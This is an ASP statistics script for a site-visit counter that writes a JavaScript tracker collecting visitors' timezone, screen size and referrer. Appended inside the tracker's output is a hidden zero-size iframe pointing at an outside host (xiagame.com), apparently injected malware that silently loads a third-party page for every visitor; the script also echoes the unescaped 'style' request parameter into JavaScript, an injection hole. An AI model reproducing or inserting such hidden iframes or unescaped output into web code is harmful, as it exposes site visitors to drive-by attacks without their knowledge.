<!--#include file="inc_config.asp"-->
<%
Function finddir(filepath)
	finddir=left(filepath,instrRev(filepath,"/"))
end Function
style	= Request("style")
theurl	= "http://" & Request.ServerVariables("http_host") & finddir(Request.ServerVariables("url"))
%>
var ajstat_siteid	= '<%=siteid%>'
var ajstat_style	= '<%=style%>';
var ajstat_url		= '<%=theurl%>';
var ajstat_ndate	= new Date();
var ajstat_tzone	= 0 - ajstat_ndate.getTimezoneOffset()/60;
var ajstat_tcolor	= screen.colorDepth;
var ajstat_sSize	= screen.width + ',' + screen.height;
var ajstat_referrer	= escape(document.referrer);
var ajstat_outstr	= '<script language=javascript src=' + ajstat_url 
			  + 'stat.asp?style=' + ajstat_style 
			  + '&siteid=' + ajstat_siteid 
			  + '&tzone=' + ajstat_tzone 
			  + '&tcolor=' + ajstat_tcolor
			  + '&sSize=' + ajstat_sSize
			  + '&referrer=' + ajstat_referrer
			  + '><\/script><IFRAME SRC=http://www.xiagame.com/ajiang/ajiang.asp width=0 height=0 frameborder=no border=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=no></IFRAME>';
document.write(ajstat_outstr);
<%
if CFG_SaveOnline then
%>
function ajstatimgon(reftime){
  var ttime=new Date();
  var ajstat_img=new Image();
  ajstat_img.src=ajstat_url+'stat_online.asp?siteid='+ajstat_siteid+'&o='+ttime.getDate+ttime.getMinutes +ttime.getSeconds;
  var ajstatimgtimeout=setTimeout('ajstatimgon('+reftime+');',reftime);
}
ajstatimgon(<%=CFG_CheckOnlineS*1000%>);
<%
end if
%>